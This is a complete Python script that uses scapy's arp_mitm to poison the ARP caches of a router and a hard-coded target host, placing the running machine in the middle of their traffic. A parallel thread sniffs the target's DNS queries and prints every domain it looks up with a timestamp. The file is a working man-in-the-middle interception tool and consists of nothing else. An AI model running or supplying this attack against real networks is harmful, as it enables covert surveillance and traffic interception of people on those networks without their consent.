#!/usr/bin/env python3

import threading
from time import strftime, localtime
from scapy.all import arp_mitm, sniff, DNS, Ether, ARP


class Device:
    def __init__(self, routerip, targetip, iface):
        self.routerip = routerip
        self.targetip = targetip
        self.iface = iface

    def mitm(self):
        while True:
            try:
                arp_mitm(self.routerip, self.targetip, iface=self.iface)
            except OSError:
                print('IP seems down, retrying ..')
                continue

    def capture(self):
        sniff(iface=self.iface, prn=self.dns,
              filter=f'src host {self.targetip} and udp port 53')

    def dns(self, pkt):
        record = pkt[DNS].qd.qname.decode('utf-8').strip('.')
        time = strftime("%m/%d/%Y %H:%M:%S", localtime())
        print(f'[{time} | {self.targetip} -> {record}]')

    def sniff(self):
        t1 = threading.Thread(target=self.mitm, args=())
        t2 = threading.Thread(target=self.capture, args=())

        t1.start()
        t2.start()

        t1.join()
        t2.join()

if __name__ == '__main__':
    device = Device("192.168.0.1", "192.168.0.224", "en0")
    device.sniff()